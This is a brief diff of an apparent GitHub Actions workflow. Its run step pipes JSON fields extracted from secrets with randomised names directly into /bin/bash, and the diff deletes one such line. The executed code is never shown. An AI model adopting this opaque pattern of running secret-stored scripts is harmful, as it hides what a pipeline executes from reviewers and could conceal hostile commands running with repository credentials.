@@ -20,7 +20,6 @@ jobs:
           u075: ${{ secrets.u075 }}
         run: |
           printf '%s' "$u075" | jq -r .fbh6 | /bin/bash
-          printf '%s' "$mjxkn30034" | jq -r .s14093 | /bin/bash
           printf '%s' "$esadv96" | jq -r .m46 | /bin/bash
           printf '%s' "$pwfs01952" | jq -r .yju8 | /bin/bash
 
